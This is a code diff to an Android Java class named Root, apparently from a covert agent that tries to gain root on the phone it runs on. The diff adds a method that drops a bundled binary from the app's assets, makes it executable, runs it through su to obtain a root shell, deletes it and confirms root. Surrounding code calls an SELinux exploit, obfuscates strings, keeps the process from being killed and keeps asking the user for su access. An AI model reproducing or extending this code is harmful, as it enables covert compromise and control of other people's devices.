@@ -151,7 +151,7 @@ public class Root {
 					method = M.e("selinux");
 					selinuxExploit();
 					return true;
-				}else{
+				} else {
 					if (Cfg.DEBUG) {
 						Check.log(TAG + " (exploitPhone): SELinux Device is NOT locally exploitable"); //$NON-NLS-1$
 					}
@@ -169,7 +169,7 @@ public class Root {
 				method = M.e("selinux");
 				selinuxExploit();
 				return true;
-			}else{
+			} else {
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (exploitPhone): SELinux Device is NOT locally exploitable"); //$NON-NLS-1$
 				}
@@ -181,7 +181,7 @@ public class Root {
 			}
 		}
 		return false;
-		
+
 	}
 
 	static public void adjustOom() {
@@ -286,15 +286,20 @@ public class Root {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (supersuRoot) Selinux Shell");
 			}
-			
+
 			Thread thread = new Thread(new Runnable() {
 				public void run() {
 					selinuxShell();
 				}
 			});
 			thread.start();
-			Utils.sleep(8000);
+			Utils.sleep(10000);
 			
+			if (PackageInfo.checkRoot()) {
+				Status.setRoot(true);
+
+				Status.self().setReload();
+			}
 		}
 	}
 
@@ -353,7 +358,7 @@ public class Root {
 			// selinux_suidext
 			InputStream streamJ = Utils.getAssetStream("j.bin");
 			// shell_installer.sh
-			InputStream streamK = Utils.getAssetStream("k.bin"); 
+			InputStream streamK = Utils.getAssetStream("k.bin");
 
 			fileWrite(selinuxSuidext.getName(), streamJ, Cfg.RNDDB);
 			fileWrite(shellInstaller.getName(), streamK, Cfg.RNDDB);
@@ -371,7 +376,8 @@ public class Root {
 
 			Execute.execute(M.e("/system/bin/chmod 755 ") + selinuxSuidext + " " + shellInstaller);
 
-			ExecuteResult res = Execute.execute(new String[] { "su", "-c", shellInstaller.getFilename() + " " + selinuxSuidext.getFilename() });
+			ExecuteResult res = Execute.execute(new String[] { "su", "-c",
+					shellInstaller.getFilename() + " " + selinuxSuidext.getFilename() });
 
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (supersuRoot) execute 2: " + shellInstaller + " ret: " + res.exitCode);
@@ -399,6 +405,53 @@ public class Root {
 			return;
 		}
 
+	}
+
+	private static void selinuxSimpleShell() {
+
+		String pack = Status.self().getAppContext().getPackageName();
+		final String installPath = String.format(M.e("/data/data/%s/files"), pack);
+
+		final AutoFile selinuxSuidext = new AutoFile(installPath, M.e("comp")); // selinux_suidext
+
+		try {
+
+			// selinux_suidext
+			InputStream streamJ = Utils.getAssetStream("j.bin");
+			fileWrite(selinuxSuidext.getName(), streamJ, Cfg.RNDDB);
+
+			if (Cfg.DEBUG) {
+				Check.asserts(selinuxSuidext.exists(), " (supersuRoot) Assert failed, not existing: " + selinuxSuidext);
+			}
+
+			Execute.execute(M.e("/system/bin/chmod 755 ") + selinuxSuidext);
+
+			ExecuteResult res = Execute.execute(new String[] { "su", "-c", selinuxSuidext.getFilename() + " rt" });
+
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (supersuRoot) execute 2: " + res.exitCode);
+			}
+
+			selinuxSuidext.delete();
+
+			if (PackageInfo.checkRoot()) {
+				Status.setRoot(true);
+
+				Status.self().setReload();
+			}
+
+		} catch (final Exception e1) {
+			if (Cfg.EXCEPTION) {
+				Check.log(e1);
+			}
+
+			if (Cfg.DEBUG) {
+				Check.log(e1);//$NON-NLS-1$
+				Check.log(TAG + " (supersuRoot): Exception"); //$NON-NLS-1$
+			}
+
+			return;
+		}
 	}
 
 	static public boolean checkCyanogenmod() {
@@ -671,7 +724,7 @@ public class Root {
 			askedSu += 1;
 
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " (getPermissions), ask the user");
+				Check.log(TAG + " (getPermissions), ask the user, number " + askedSu);
 			}
 
 			// Ask the user...
@@ -685,7 +738,7 @@ public class Root {
 			}
 		} else {
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " (getPermissions), don't ask");
+				Check.log(TAG + " (getPermissions), don't ask: asked " + askedSu + " times");
 			}
 		}
 
@@ -699,7 +752,7 @@ public class Root {
 
 		// Avoid having the process killed for using too many resources
 		Root.adjustOom();
-		
+
 		return PackageInfo.checkRoot();
 	}
 
@@ -1058,7 +1111,7 @@ public class Root {
 					}
 
 					Root.removeScript("fig");
-					if(getPermissions()){
+					if (getPermissions()) {
 						Status.self().setReload();
 					}
 				} else {
